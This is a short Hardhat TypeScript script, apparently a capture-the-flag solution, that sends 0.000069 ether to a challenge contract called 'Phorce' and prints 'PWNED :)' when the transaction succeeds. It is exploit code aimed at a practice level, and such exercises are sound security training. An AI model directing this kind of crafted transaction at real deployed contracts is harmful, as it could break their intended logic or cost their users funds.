import { ethers } from "hardhat"
import { LEVEL_ADDRESSES, ADDRESSES } from "../consts"
import { getSigner } from "../utils"

async function pwn() {
    const signer = await getSigner()
    const contract = await ethers.getContractAt(
        "Phorce",
        ADDRESSES.phorce,
        signer
    )
    const call = await signer?.sendTransaction({
        to: ADDRESSES.phorce,
        value: ethers.utils.parseUnits("0.000069", 18),
        gasLimit: "100000"
    })
    console.log(`
        Hang tight. Pwnage happening...    
    `)
    const receipt = await call?.wait()
    if (receipt?.status == 0) {return}
    console.log(`
        PWNED :)
    `)
}

pwn()